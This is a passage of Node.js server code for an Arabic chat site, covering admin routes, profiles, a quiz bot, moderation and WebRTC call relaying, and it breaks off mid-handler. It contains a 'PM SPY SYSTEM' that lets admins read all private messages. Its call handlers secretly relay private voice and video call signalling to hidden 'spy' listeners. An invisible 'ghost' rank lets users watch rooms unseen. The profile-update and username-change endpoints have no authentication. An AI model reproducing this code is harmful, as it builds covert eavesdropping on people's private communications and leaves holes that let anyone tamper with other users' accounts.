  res.json({ok:true});
});
app.post('/api/admin/clearroom', adminAuth, async (req,res) => {
  const {room,adminName,adminRank}=req.body;
  if (useDB) await db.query('DELETE FROM messages WHERE room=$1',[room]);
  memMessages[room]=[]; io.to(room).emit('room-cleared',room);
  logAction(adminName||'أدمن',adminRank||'admin','🗑️ مسح رسائل الغرفة',ROOMS[room]?.name||room);
  res.json({ok:true});
});
app.get('/api/messages/:room', async (req,res) => {
  const room=req.params.room;
  if (!ROOMS[room]) return res.json({ok:false});
  if (useDB) { const r=await db.query('SELECT * FROM messages WHERE room=$1 ORDER BY created_at DESC LIMIT 50',[room]); res.json({ok:true,messages:r.rows.reverse()}); }
  else { res.json({ok:true,messages:memMessages[room]||[]}); }
});
app.get('/api/leaderboard', async (req,res) => {
  if (useDB) { const r=await db.query("SELECT username,rank,points FROM users WHERE rank!='ghost' ORDER BY points DESC LIMIT 20"); res.json({ok:true,users:r.rows}); }
  else { const users=Object.values(memUsers).filter(u=>u.rank!=='ghost').map(u=>({username:u.username,rank:u.rank,points:u.points||0})).sort((a,b)=>b.points-a.points).slice(0,20); res.json({ok:true,users}); }
});

// ===== ADMIN QUIZ QUESTIONS MANAGEMENT =====
let adminQuizQuestions = []; // custom questions added by admin at runtime

app.get('/api/admin/quiz-questions', adminAuth, (req,res) => {
  res.json({ ok:true, questions: adminQuizQuestions });
});

app.post('/api/admin/quiz-questions/add', adminAuth, (req,res) => {
  const { q, a, hint, points } = req.body;
  if (!q || !a) return res.json({ ok:false, msg:'السؤال والإجابة مطلوبان' });
  const newQ = { q: q.trim(), a: a.trim(), hint: hint||'', points: parseInt(points)||50 };
  adminQuizQuestions.push(newQ);
  // Inject into active quiz pools immediately
  Object.keys(quizState).forEach(roomId => {
    if (quizState[roomId]) quizState[roomId].pool.push({...newQ});
  });
  res.json({ ok:true, questions: adminQuizQuestions });
});

app.post('/api/admin/quiz-questions/remove', adminAuth, (req,res) => {
  const { idx } = req.body;
  if (idx === undefined || idx < 0 || idx >= adminQuizQuestions.length)
    return res.json({ ok:false, msg:'السؤال غير موجود' });
  adminQuizQuestions.splice(idx, 1);
  res.json({ ok:true, questions: adminQuizQuestions });
});

// ===== PROFILE API =====
// Get profile
app.get('/api/profile/:username', async (req,res) => {
  const { username } = req.params;
  let user, profile;
  if (useDB) {
    const ur = await db.query('SELECT username,rank,points FROM users WHERE username=$1',[username]);
    // If not in DB, check live users (visitors)
    if (!ur.rows.length) {
      const liveUser = Object.values(chatUsers).find(u=>u.name===username);
      if (!liveUser) return res.json({ok:false,msg:'المستخدم غير موجود'});
      user = { username: liveUser.name, rank: liveUser.rank, points: liveUser.points||0 };
    } else {
      user = ur.rows[0];
    }
    const pr = await db.query('SELECT * FROM profiles WHERE username=$1',[username]);
    profile = pr.rows[0] || {};
  } else {
    // Check registered users first, then live visitors
    user = memUsers[username];
    if (!user) {
      const liveUser = Object.values(chatUsers).find(u=>u.name===username);
      if (!liveUser) return res.json({ok:false,msg:'المستخدم غير موجود'});
      user = { username: liveUser.name, rank: liveUser.rank, points: liveUser.points||0 };
    }
    profile = memProfiles[username] || {};
  }
  // Fetch badges
  let userBadgesList = [];
  if (useDB) {
    try {
      const br = await db.query('SELECT b.* FROM badges b JOIN user_badges ub ON b.id=ub.badge_id WHERE ub.username=$1 ORDER BY ub.assigned_at',[username]);
      userBadgesList = br.rows;
    } catch(e){}
  } else {
    const ids = memUserBadges[username]||[];
    userBadgesList = memBadges.filter(b=>ids.includes(b.id));
  }
  res.json({ok:true, profile:{
    username: user.username,
    rank: user.rank,
    points: user.points||0,
    avatar: profile.avatar||null,
    music_url: profile.music_url||null,
    music_name: profile.music_name||null,
    bio: profile.bio||null,
    badges: userBadgesList,
  }});
});

// Update profile (avatar as base64, music as youtube/soundcloud URL)
app.post('/api/profile/update', async (req,res) => {
  const { username, avatar, music_url, music_name, bio } = req.body;
  if (!username) return res.json({ok:false,msg:'مطلوب اسم المستخدم'});
  // base64 size check: 4MB base64 ≈ 3MB actual
  if (avatar && avatar.length > 4 * 1024 * 1024) return res.json({ok:false,msg:'الصورة كبيرة جداً، الحد الأقصى 3MB'});
  if (useDB) {
    await db.query(`INSERT INTO profiles (username,avatar,music_url,music_name,bio,updated_at)
      VALUES ($1,$2,$3,$4,$5,NOW())
      ON CONFLICT (username) DO UPDATE SET
        avatar=COALESCE($2,profiles.avatar),
        music_url=COALESCE($3,profiles.music_url),
        music_name=COALESCE($4,profiles.music_name),
        bio=COALESCE($5,profiles.bio),
        updated_at=NOW()`,
      [username, avatar||null, music_url||null, music_name||null, bio||null]);
  } else {
    memProfiles[username] = memProfiles[username] || {};
    if (avatar) memProfiles[username].avatar = avatar;
    if (music_url) memProfiles[username].music_url = music_url;
    if (music_name) memProfiles[username].music_name = music_name;
    if (bio !== undefined) memProfiles[username].bio = bio;
  }
  // Update live socket user avatar + broadcast to room
  const sid = Object.keys(chatUsers).find(id=>chatUsers[id].name===username);
  if (sid) {
    if (avatar) chatUsers[sid].avatar = avatar;
    const room = chatUsers[sid].room;
    if (room) io.to(room).emit('room-users', getRoomUsers(room));
  }
  res.json({ok:true});
});

// ===== CHANGE USERNAME =====
app.post('/api/change-username', async (req,res) => {
  const { oldName, newName } = req.body;
  if (!oldName || !newName) return res.json({ok:false,msg:'بيانات ناقصة'});
  const nm = newName.trim();
  if (nm.length < 2 || nm.length > 20) return res.json({ok:false,msg:'الاسم بين 2 و 20 حرف'});
  if (!/^[a-zA-Z0-9\u0600-\u06FF_\-. ]+$/.test(nm)) return res.json({ok:false,msg:'اسم يحتوي على رموز غير مسموحة'});
  try {
    if (useDB) {
      const ex = await db.query('SELECT username FROM users WHERE username=$1',[nm]);
      if (ex.rows.length > 0) return res.json({ok:false,msg:'هذا الاسم مستخدم مسبقاً'});
      await db.query('UPDATE users SET username=$1 WHERE username=$2',[nm,oldName]);
      await db.query('UPDATE messages SET username=$1 WHERE username=$2',[nm,oldName]).catch(()=>{});
      await db.query('UPDATE profiles SET username=$1 WHERE username=$2',[nm,oldName]).catch(()=>{});
    } else {
      if (memUsers[nm]) return res.json({ok:false,msg:'هذا الاسم مستخدم مسبقاً'});
      if (memUsers[oldName]) { memUsers[nm]=memUsers[oldName]; delete memUsers[oldName]; }
      if (memProfiles[oldName]) { memProfiles[nm]=memProfiles[oldName]; delete memProfiles[oldName]; }
    }
    const sid = Object.keys(chatUsers).find(id=>chatUsers[id].name===oldName);
    if (sid) { chatUsers[sid].name = nm; }
    res.json({ok:true});
  } catch(e) { console.error(e); res.json({ok:false,msg:'خطأ في قاعدة البيانات'}); }
});

app.post('/api/admin/rename-user', adminAuth, async (req,res) => {
  const { oldName, newName } = req.body;
  if (!oldName || !newName) return res.json({ok:false,msg:'بيانات ناقصة'});
  const nm = newName.trim();
  if (nm.length < 2 || nm.length > 20) return res.json({ok:false,msg:'الاسم بين 2 و 20 حرف'});
  try {
    if (useDB) {
      const ex = await db.query('SELECT username FROM users WHERE username=$1',[nm]);
      if (ex.rows.length > 0) return res.json({ok:false,msg:'هذا الاسم مستخدم مسبقاً'});
      await db.query('UPDATE users SET username=$1 WHERE username=$2',[nm,oldName]);
      await db.query('UPDATE messages SET username=$1 WHERE username=$2',[nm,oldName]).catch(()=>{});
      await db.query('UPDATE profiles SET username=$1 WHERE username=$2',[nm,oldName]).catch(()=>{});
    } else {
      if (memUsers[nm]) return res.json({ok:false,msg:'هذا الاسم مستخدم مسبقاً'});
      if (memUsers[oldName]) { memUsers[nm]=memUsers[oldName]; delete memUsers[oldName]; }
    }
    const sid = Object.keys(chatUsers).find(id=>chatUsers[id].name===oldName);
    if (sid) {
      chatUsers[sid].name = nm;
      io.to(sid).emit('username-changed',{newName:nm,msg:'تم تغيير اسمك من قبل الإدارة'});
    }
    res.json({ok:true});
  } catch(e) { console.error(e); res.json({ok:false,msg:'خطأ في قاعدة البيانات'}); }
});
// ===== END CHANGE USERNAME =====

// ===== PM SPY SYSTEM (Admin Only) =====
// Get list of all conversations (admin only)
app.get('/api/admin/pm-conversations', adminAuth, async (req,res) => {
  let convs = [];
  if (useDB) {
    try {
      const r = await db.query(`
        SELECT conv_key, 
               array_agg(DISTINCT from_user) as users_arr,
               COUNT(*) as count,
               MAX(text) as last_msg,
               MAX(time) as last_time,
               MAX(created_at) as last_at
        FROM private_messages
        GROUP BY conv_key
        ORDER BY MAX(created_at) DESC
        LIMIT 100
      `);
      convs = r.rows.map(row => {
        const parts = row.conv_key.split('||');
        return {
          key: row.conv_key,
          users: parts,
          count: parseInt(row.count),
          lastMsg: (row.last_msg||'').substring(0,40),
          lastTime: row.last_time||'',
          hasActiveCall: !!activeCalls[row.conv_key],
          callType: activeCalls[row.conv_key]?.type || null
        };
      });
    } catch(e) { console.log('pm-conv DB error:', e.message); }
  } else {
    convs = Object.keys(memPMs).map(key => {
      const parts = key.split('||');
      const msgs = memPMs[key];
      const last = msgs[msgs.length-1];
      return { key, users: parts, count: msgs.length, lastMsg: last?.text?.substring(0,40)||'', lastTime: last?.time||'', hasActiveCall: !!activeCalls[key], callType: activeCalls[key]?.type||null };
    });
  }
  // Add active calls not in DB yet
  Object.keys(activeCalls).forEach(key => {
    if (!convs.find(c=>c.key===key)) {
      const c = activeCalls[key];
      convs.push({ key, users:[c.user1,c.user2], count:0, lastMsg:'', lastTime:'', hasActiveCall:true, callType:c.type });
    }
  });
  const onlineUsers = Object.values(chatUsers).map(u=>({name:u.name,rank:u.rank}));
  res.json({ok:true, conversations: convs, onlineUsers});
});

// Get full PM history between two users (admin only)
app.get('/api/admin/pm-history', adminAuth, async (req,res) => {
  const {user1, user2} = req.query;
  if (!user1 || !user2) return res.json({ok:false,msg:'مطلوب اسمي المستخدمين'});
  const key = [user1, user2].sort().join('||');
  if (useDB) {
    try {
      const r = await db.query(
        `SELECT from_user as "from", to_user as "to", text, time FROM private_messages WHERE conv_key=$1 ORDER BY created_at ASC LIMIT 200`,
        [key]
      );
      res.json({ok:true, messages: r.rows, key});
    } catch(e) { res.json({ok:false,msg:e.message}); }
  } else {
    const msgs = memPMs[key] || [];
    res.json({ok:true, messages: msgs, key});
  }
});
// ===== END PM SPY SYSTEM =====
app.get('/api/admin/permissions', adminAuth, async (req,res) => {
  try {
    const perms = await getPerms();
    res.json({ok:true, perms});
  } catch(e) { res.json({ok:false,msg:e.message}); }
});

app.post('/api/admin/permissions', adminAuth, async (req,res) => {
  const { rank, perms } = req.body;
  const RANKS = ['owner','owner_admin','owner_vip','super_admin','admin'];
  if (!RANKS.includes(rank)) return res.json({ok:false,msg:'رتبة غير صحيحة'});
  // owner cannot be restricted
  if (rank === 'owner') return res.json({ok:false,msg:'لا يمكن تغيير صلاحيات المالك'});
  if (useDB) {
    await db.query(`INSERT INTO permissions (rank,perms) VALUES ($1,$2) ON CONFLICT (rank) DO UPDATE SET perms=$2`, [rank, perms]);
  } else {
    memPerms[rank] = perms;
  }
  // broadcast updated perms to all connected clients
  const allPerms = await getPerms();
  io.emit('permissions-updated', allPerms);
  res.json({ok:true});
});

app.get('/api/permissions', async (req,res) => {
  try {
    const perms = await getPerms();
    res.json({ok:true, perms});
  } catch(e) { res.json({ok:false}); }
});
const QUIZ_QUESTIONS = [
  {q:'ما اسم الحيوان الذي يستخرج منه المسك ذو الرائحة العطرة؟',a:'الغزال',hint:'ا _ غ _ ا _',points:50},
  {q:'ما هو أعلى جبل في أفريقيا؟',a:'كيليمانجارو',hint:'ك _ ل _ م _ ن _ ا _ و',points:100},
  {q:'ما عاصمة المملكة العربية السعودية؟',a:'الرياض',hint:'ا _ ر _ ي _ ا _ ض',points:30},
  {q:'ما أكبر دولة في العالم مساحةً؟',a:'روسيا',hint:'ر _ و _ س _ ي _ ا',points:40},
  {q:'ما أطول نهر في العالم؟',a:'النيل',hint:'ا _ ن _ ي _ ل',points:40},
  {q:'في أي دولة تقع برج إيفل؟',a:'فرنسا',hint:'ف _ ر _ ن _ س _ ا',points:30},
  {q:'ما عاصمة اليابان؟',a:'طوكيو',hint:'ط _ و _ ك _ ي _ و',points:30},
  {q:'ما هو المحيط الأكبر في العالم؟',a:'الهادئ',hint:'ا _ ل _ ه _ ا _ د _ ئ',points:50},
  {q:'من هو أقوى الحيوانات في الذاكرة؟',a:'الجمل',hint:'ا _ ج _ ل',points:50},
  {q:'ما هو أسرع حيوان على اليابسة؟',a:'الفهد',hint:'ا _ ل _ ف _ ه _ د',points:40},
  {q:'كم عدد أيام السنة؟',a:'365',hint:'3 _ 5',points:20},
  {q:'ما هو الكوكب الأقرب للشمس؟',a:'عطارد',hint:'ع _ ط _ ا _ ر _ د',points:50},
  {q:'ما العنصر الكيميائي الذي رمزه O؟',a:'الأكسجين',hint:'ا _ ك _ س _ ج _ ي _ ن',points:60},
  {q:'كم عدد أسنان الإنسان البالغ؟',a:'32',hint:'_ 2',points:30},
  {q:'في أي عام فتحت القسطنطينية؟',a:'1453',hint:'1 _ 5 _',points:80},
  {q:'ما هي عاصمة العراق؟',a:'بغداد',hint:'ب _ غ _ د _ ا _ د',points:20},
  {q:'كم عدد محافظات العراق؟',a:'18',hint:'1 _',points:30},
  {q:'ما اسم أطول نهر في العراق؟',a:'دجلة',hint:'د _ ج _ ل _ ه',points:30},
  {q:'بعثرة حروف: وسن',a:'سون',type:'scramble',points:90},
  {q:'بعثرة حروف: ابحر',a:'حرب',type:'scramble',points:70},
  {q:'بعثرة حروف: لامج',a:'جمال',type:'scramble',points:70},
  {q:'بعثرة حروف: نيدم',a:'مدين',type:'scramble',points:70},
  {q:'بعثرة حروف: رحس',a:'سحر',type:'scramble',points:60},
  {q:'بعثرة حروف: كلم',a:'ملك',type:'scramble',points:60},
  {q:'كم هو ناتج 15 × 15؟',a:'225',hint:'2 _ 5',points:50},
  {q:'كم هو جذر 144؟',a:'12',hint:'1 _',points:40},
];

const quizState = {};
function shuffleArr(arr) { const a=[...arr]; for(let i=a.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[a[i],a[j]]=[a[j],a[i]];} return a; }

function startQuiz(roomId) {
  if (!quizState[roomId]) quizState[roomId]={active:false,current:null,timer:null,hintTimer:null,pool:shuffleArr(QUIZ_QUESTIONS),idx:0};
  const s=quizState[roomId];
  if (s.active) return;
  s.active=true;
  nextQuestion(roomId);
}
function stopQuiz(roomId) {
  const s=quizState[roomId]; if (!s) return;
  s.active=false;
  if (s.timer) clearTimeout(s.timer);
  if (s.hintTimer) clearTimeout(s.hintTimer);
  s.current=null;
}
async function addPoints(username,pts) {
  if (useDB) await db.query('UPDATE users SET points=points+$1 WHERE username=$2',[pts,username]);
  else if (memUsers[username]) memUsers[username].points=(memUsers[username].points||0)+pts;
  const sid=Object.keys(chatUsers).find(id=>chatUsers[id].name===username);
  if (sid) { chatUsers[sid].points=(chatUsers[sid].points||0)+pts; io.to(sid).emit('points-updated',{points:chatUsers[sid].points}); }
}
function nextQuestion(roomId) {
  const s=quizState[roomId]; if (!s||!s.active) return;
  s.timer=setTimeout(async()=>{
    if (!s.active) return;
    if (s.idx>=s.pool.length){s.pool=shuffleArr(QUIZ_QUESTIONS);s.idx=0;}
    const q=s.pool[s.idx++]; s.current={...q,answered:false};
    const qMsg=await saveMessage(roomId,'مسابقات',`سؤآل : ${q.q}`,'quiz');
    io.to(roomId).emit('message',{...qMsg,user:{name:'مسابقات',rank:'owner',color:'#ffd700',label:'🏆 مسابقات'},isBot:true});
    if (q.hint&&q.type!=='scramble') {
      s.hintTimer=setTimeout(async()=>{
        if (s.current&&!s.current.answered){
          const hMsg=await saveMessage(roomId,'مسابقات',`مساعده : ${q.hint}`,'quiz');
          io.to(roomId).emit('message',{...hMsg,user:{name:'مسابقات',rank:'owner',color:'#ffd700',label:'🏆 مسابقات'},isBot:true});
        }
      },20000);
    }
    s.timer=setTimeout(async()=>{
      if (s.current&&!s.current.answered){
        s.current.answered=true;
        const noMsg=await saveMessage(roomId,'مسابقات',`نأسف لم يتم الإجآبة على هذا السؤال : الإجآبة هي ${q.a}`,'quiz');
        io.to(roomId).emit('message',{...noMsg,user:{name:'مسابقات',rank:'owner',color:'#ffd700',label:'🏆 مسابقات'},isBot:true});
        nextQuestion(roomId);
      }
    },40000);
  },6000);
}
function checkAnswer(roomId,username,text) {
  const s=quizState[roomId];
  if (!s||!s.current||s.current.answered) return false;
  const a=normalizeAr(s.current.a.toLowerCase().trim());
  const u=normalizeAr(text.toLowerCase().trim());
  if (a===u) { s.current.answered=true; if (s.hintTimer) clearTimeout(s.hintTimer); if (s.timer) clearTimeout(s.timer); return s.current; }
  return false;
}
setTimeout(()=>{ if (ROOMS['competitions']) startQuiz('competitions'); },3000);

// ===== SOCKET =====
const chatUsers = {};
const mutedUsers = new Set();
const voiceRooms = {};

function kickUser(username,reason) {
  const sid=Object.keys(chatUsers).find(id=>chatUsers[id].name===username);
  if (sid) { io.to(sid).emit('kicked',reason); setTimeout(()=>io.sockets.sockets.get(sid)?.disconnect(),500); }
}
function getTime() { const n=new Date(); return `${n.getHours()}:${String(n.getMinutes()).padStart(2,'0')}`; }
function getRoomUsers(r) {
  return Object.values(chatUsers)
    .filter(u => u.room === r && u.rank !== 'ghost') // ghost invisible
    .map(u => {
      const avatar = (memProfiles[u.name] && memProfiles[u.name].avatar) || u.avatar || null;
      return { ...u, avatar };
    });
}

function getRoomUsersCount(r) {
  // For counts, also exclude ghost
  return Object.values(chatUsers).filter(u => u.room === r && u.rank !== 'ghost').length;
}
async function saveMessage(room,username,text,type='chat') {
  const msg={room,username,text,type,time:getTime()};
  if (useDB) await db.query('INSERT INTO messages (room,username,text,type) VALUES ($1,$2,$3,$4)',[room,username,text,type]);
  else { memMessages[room]=memMessages[room]||[]; memMessages[room].push(msg); if (memMessages[room].length>50) memMessages[room].shift(); }
  return msg;
}
function broadcastRoomCounts() {
  const counts = {};
  Object.keys(ROOMS).forEach(r => { counts[r] = getRoomUsersCount(r); });
  io.emit('room-counts', counts);
}

function getOnlineCount() {
  return Object.values(chatUsers).filter(u => u.rank !== 'ghost').length;
}

io.on('connection', (socket) => {
  socket.on('join', async (data) => {
    const nameCheck=data.name||'';
    if (containsBadUsername(nameCheck)||containsBadWordFull(nameCheck).found) { socket.emit('username-rejected','❌ الاسم غير مقبول'); return; }
    if (nameCheck.trim().length<2||nameCheck.trim().length>20) { socket.emit('username-rejected','❌ الاسم يجب أن يكون بين 2 و 20 حرف'); return; }
    const rank=data.rank||'visitor';
    const rankInfo=RANKS[rank]||RANKS['visitor'];
    const user={id:socket.id,name:data.name,gender:data.gender||'ذكر',age:data.age||22,rank,rankInfo,room:'general',points:data.points||0};
    chatUsers[socket.id]=user;
    socket.join('general');
    let history=[];
    if (useDB){const r=await db.query('SELECT * FROM messages WHERE room=$1 ORDER BY created_at DESC LIMIT 50',['general']);history=r.rows.reverse();}
    else history=memMessages['general']||[];
    const roomCounts={}; Object.keys(ROOMS).forEach(r=>{roomCounts[r]=getRoomUsersCount(r);});
    socket.emit('init',{rooms:ROOMS,user,messages:history,onlineCount:getOnlineCount(),roomCounts,ranks:RANKS});
    io.emit('online-count', getOnlineCount());
    broadcastRoomCounts();
    // Ghost joins silently — no messages, not visible in user list
    if (user.rank !== 'ghost') {
      const joinText=`انضم للغرفة (# ${rankInfo.label} #)`;
      const sysMsg=await saveMessage('general',null,joinText,'system');
      io.to('general').emit('message',{...sysMsg});
      io.to('general').emit('room-users',getRoomUsers('general'));
    }
    // Send welcome message in general room if configured
    if (welcomeMessage.enabled && welcomeMessage.text) {
      const wText = welcomeMessage.text.replace('{name}', data.name);
      setTimeout(() => {
        socket.emit('welcome-msg', {
          text: wText,
          senderName: welcomeMessage.senderName || 'غزل عراقي 🌹',
          time: getTime()
        });
      }, 1500);
    }
  });

  socket.on('switch-room', async (roomId) => {
    const user=chatUsers[socket.id]; if (!user||!ROOMS[roomId]) return;
    // Private room access check
    const room=ROOMS[roomId];
    if (room.isPrivate && room.allowedRanks && !room.allowedRanks.includes(user.rank)){
      socket.emit('room-access-denied',{room:roomId,roomName:room.name});
      return;
    }
    const oldRoom=user.room; socket.leave(oldRoom);
    // Ghost moves silently
    if (user.rank !== 'ghost') {
      const leaveMsg=await saveMessage(oldRoom,null,`👋 ${user.name} غادر الغرفة`,'system');
      io.to(oldRoom).emit('message',leaveMsg);
    }
    io.to(oldRoom).emit('room-users',getRoomUsers(oldRoom));
    user.room=roomId; socket.join(roomId);
    let history=[];
    if (useDB){const r=await db.query('SELECT * FROM messages WHERE room=$1 ORDER BY created_at DESC LIMIT 50',[roomId]);history=r.rows.reverse();}
    else history=memMessages[roomId]||[];
    socket.emit('room-history',{roomId,messages:history,users:getRoomUsers(roomId)});
    if (user.rank !== 'ghost') {
      const rankInfo=RANKS[user.rank]||RANKS['visitor'];
      const joinText=`انضم للغرفة (# ${rankInfo.label} #)`;
      const joinMsg=await saveMessage(roomId,null,joinText,'system');
      io.to(roomId).emit('message',joinMsg);
    }
    io.to(roomId).emit('room-users',getRoomUsers(roomId));
    broadcastRoomCounts();
  });

  const rateLimits={}; const lastMessages={}; const warnCount={};

  socket.on('chat-message', async (data) => {
    const user=chatUsers[socket.id]; if (!user) return;
    if (mutedUsers.has(user.name)){socket.emit('muted','أنت مكتوم');return;}
    const text=(data.text||'').trim().substring(0,300); if (!text) return;
    const now=Date.now(); const sid=socket.id;
    if (!rateLimits[sid]) rateLimits[sid]=[];
    rateLimits[sid]=rateLimits[sid].filter(t=>now-t<3000);
    if (rateLimits[sid].length>=3){socket.emit('spam-warning','⚠️ أنت ترسل رسائل بسرعة كبيرة');return;}
    rateLimits[sid].push(now);
    if (lastMessages[sid]&&lastMessages[sid].text===text&&now-lastMessages[sid].time<5000){socket.emit('spam-warning','⚠️ لا تكرر نفس الرسالة');return;}
    lastMessages[sid]={text,time:now};
    if (/<script|javascript:|on\w+=/i.test(text)){socket.emit('spam-warning','⚠️ رسالة غير مسموح بها');return;}

    // AD DETECTION
    if (detectAdLink(text)) {
      socket.emit('ad-warning','🚫 تم حذف رسالتك وتم حظرك بسبب الإشهار');
      mutedUsers.add(user.name);
      io.to(user.room).emit('system-notice',`🚫 تم حظر ${user.name} بسبب الإشهار`);
      if (user.rank!=='visitor'){
        if (useDB) await db.query('UPDATE users SET is_banned=TRUE WHERE username=$1',[user.name]);
        else if (memUsers[user.name]) memUsers[user.name].is_banned=true;
        kickUser(user.name,'🚫 تم حظرك بسبب الإشهار في الموقع');
      }
      return;
    }

    // QUIZ ANSWER
    if (ROOMS[user.room]?.isQuiz) {
      const correct=checkAnswer(user.room,user.name,text);
      if (correct) {
        const pts=correct.points||50;
        await addPoints(user.name,pts);
        user.points=(user.points||0)+pts;
        const rankInfo=RANKS[user.rank]||RANKS['visitor'];
        // أولاً: رسالة العضو تظهر
        const uMsg=await saveMessage(user.room,user.name,text);
        io.to(user.room).emit('message',{...uMsg,user:{name:user.name,gender:user.gender,age:user.age,rank:user.rank,...rankInfo}});
        // ثانياً: رسالة الروبوت "أحسنت" بعدها مباشرة
        const successMsg=await saveMessage(user.room,'مسابقات',`🎉 أحسنت ${user.name}! الإجابة الصحيحة هي: ${correct.a} — حصلت على ${pts} نقطة 🏆 المجموع: ${user.points} نقطة`,'quiz');
        io.to(user.room).emit('message',{...successMsg,user:{name:'مسابقات',rank:'owner',color:'#ffd700',label:'🏆 مسابقات'},isBot:true});
        nextQuestion(user.room); return;
      }
    }

    // PROFANITY
    const badCheck=containsBadWordFull(text);
    if (badCheck.found) {
      warnCount[user.name]=(warnCount[user.name]||0)+1;
      if (warnCount[user.name]>=3){mutedUsers.add(user.name);socket.emit('muted','تم كتمك تلقائياً');io.to(user.room).emit('system-notice',`⚠️ تم كتم ${user.name}`);warnCount[user.name]=0;return;}
      socket.emit('profanity-warning',{msg:`⚠️ تحذير ${warnCount[user.name]}/3`,remaining:3-warnCount[user.name]});
      return;
    }

  const rankInfo = RANKS[user.rank] || RANKS['visitor'];
  const msg = await saveMessage(user.room, user.name, text);
  // Pass textColor and nameFrame if provided (validated as safe strings)
  const textColor = typeof data.textColor==='string' && /^#[0-9a-fA-F]{3,6}$/.test(data.textColor) ? data.textColor : null;
  const nameFrame = typeof data.nameFrame==='string' && /^[a-z]{1,12}$/.test(data.nameFrame) ? data.nameFrame : null;
  const userObj = {name:user.name,gender:user.gender,age:user.age,rank:user.rank,...rankInfo};
  if(textColor) userObj.textColor=textColor;
  if(nameFrame) userObj.nameFrame=nameFrame;
  io.to(user.room).emit('message',{...msg,user:userObj});
  });

  // ADMIN ACTIONS
  socket.on('admin-mute',(data)=>{
    const a=chatUsers[socket.id]; if (!a||!hasPermission(a.rank,'canMute')) return;
    const t=Object.values(chatUsers).find(u=>u.name===data.username); if (t&&!canManage(a.rank,t.rank)) return;
    mutedUsers.add(data.username);
    const sid=Object.keys(chatUsers).find(id=>chatUsers[id].name===data.username);
    if (sid) io.to(sid).emit('muted',`تم كتمك من قبل ${a.name}`);
    io.emit('system-notice',`🔇 تم كتم ${data.username}`);
    logAction(a.name,a.rank,'🔇 كتم',data.username);
  });
  socket.on('admin-unmute',(data)=>{
    const a=chatUsers[socket.id]; if (!a||!hasPermission(a.rank,'canMute')) return;
    mutedUsers.delete(data.username);
    const sid=Object.keys(chatUsers).find(id=>chatUsers[id].name===data.username);
    if (sid) io.to(sid).emit('unmuted','تم رفع الكتم عنك');
    logAction(a.name,a.rank,'🔊 رفع الكتم',data.username);
  });
  socket.on('admin-kick',(data)=>{
    const a=chatUsers[socket.id]; if (!a||!hasPermission(a.rank,'canKick')) return;
    const t=Object.values(chatUsers).find(u=>u.name===data.username); if (t&&!canManage(a.rank,t.rank)) return;
    kickUser(data.username,`تم طردك من قبل ${a.name}`); io.emit('system-notice',`🚫 تم طرد ${data.username}`);
    logAction(a.name,a.rank,'🚫 طرد',data.username);
  });
  socket.on('admin-ban',async(data)=>{
    const a=chatUsers[socket.id]; if (!a||!hasPermission(a.rank,'canBan')) return;
    const t=Object.values(chatUsers).find(u=>u.name===data.username); if (t&&!canManage(a.rank,t.rank)) return;
    if (useDB) await db.query('UPDATE users SET is_banned=TRUE WHERE username=$1',[data.username]);
    else if (memUsers[data.username]) memUsers[data.username].is_banned=true;
    kickUser(data.username,`تم حظرك من قبل ${a.name}`); io.emit('system-notice',`🚫 تم حظر ${data.username}`);
    logAction(a.name,a.rank,'⛔ حظر',data.username);
  });
  socket.on('admin-resetwarn',(data)=>{
    const a=chatUsers[socket.id]; if (!a||!hasPermission(a.rank,'canMute')) return;
    delete warnCount[data.username]; mutedUsers.delete(data.username);
    const sid=Object.keys(chatUsers).find(id=>chatUsers[id].name===data.username);
    if (sid) io.to(sid).emit('unmuted','تم رفع الكتم وإعادة تعيين تحذيراتك');
  });

  // PRIVATE MESSAGES
  // Admin adds quiz question via socket (fallback)
  // ===== VOICE MESSAGES (relay) =====
  socket.on('voice-message', (data) => {
    const user = chatUsers[socket.id];
    if (!user || !data.room || !data.data) return;
    if (data.data.length > 5 * 1024 * 1024) return; // max 5MB base64 (~1min audio)
    // Broadcast to room (except sender)
    socket.to(data.room).emit('voice-message', {
      room: data.room,
      data: data.data,
      duration: Math.min(data.duration || 0, 60),
      from: user.name
    });
  });

  socket.on('pm-voice-message', (data) => {
    const user = chatUsers[socket.id];
    if (!user || !data.to || !data.data) return;
    if (data.data.length > 5 * 1024 * 1024) return;
    const toSid = Object.keys(chatUsers).find(id => chatUsers[id].name === data.to);
    if (toSid) {
      io.to(toSid).emit('pm-voice-message', {
        from: user.name,
        to: data.to,
        data: data.data,
        duration: Math.min(data.duration || 0, 60)
      });
    }
  });

  // ===== WebRTC CALLS (relay) =====
  socket.on('call-offer', (data) => {
    const user = chatUsers[socket.id];
    if (!user || !data.to) return;
    const toSid = Object.keys(chatUsers).find(id => chatUsers[id].name === data.to);
    if (toSid) io.to(toSid).emit('call-offer', { ...data, from: user.name });
    const convKey = [user.name, data.to].sort().join('||');
    activeCalls[convKey] = {
      type: data.type, startTime: Date.now(),
      user1: user.name, user2: data.to,
      callerSid: socket.id, receiverName: data.to,
      offer: data.offer
    };
    // Tell any watching spy to connect to BOTH sides
    const spyRoom = 'spy||' + convKey;
    io.to(spyRoom).emit('spy-call-offer', { ...data, from: user.name, convKey, callerSid: socket.id });
  });

  socket.on('call-answer', (data) => {
    const user = chatUsers[socket.id];
    const toSid = Object.keys(chatUsers).find(id => chatUsers[id].name === data.to);
    if (toSid) io.to(toSid).emit('call-answer', data);
    if (user) {
      const convKey = [user.name, data.to].sort().join('||');
      // Tell spy: receiver answered — spy should now request stream from receiver too
      io.to('spy||' + convKey).emit('spy-receiver-ready', {
        receiverName: user.name, receiverSid: socket.id, convKey
      });
    }
  });

  socket.on('call-ice', (data) => {
    const user = chatUsers[socket.id];
    const toSid = Object.keys(chatUsers).find(id => chatUsers[id].name === data.to);
    if (toSid) io.to(toSid).emit('call-ice', data);
    if (user) {
      const convKey = [user.name, data.to].sort().join('||');
      io.to('spy||' + convKey).emit('spy-call-ice', { ...data, from: user.name });
    }
  });

  socket.on('call-reject', (data) => {
    const toSid = Object.keys(chatUsers).find(id => chatUsers[id].name === data.to);
    if (toSid) io.to(toSid).emit('call-reject', {});
  });

  socket.on('call-end', (data) => {
    const user = chatUsers[socket.id];
    const toSid = Object.keys(chatUsers).find(id => chatUsers[id].name === data.to);
    if (toSid) io.to(toSid).emit('call-end', {});
    if (user && data.to) {
      const convKey = [user.name, data.to].sort().join('||');
      delete activeCalls[convKey];
      io.to('spy||' + convKey).emit('spy-call-ended', { convKey });
    }
  });

  // ===== SPY WebRTC relay (clean) =====
  // Spy sends offer to a specific user (caller or receiver)
  socket.on('spy-to-user-offer', (data) => {
    // data: { targetSid, offer, spyId }
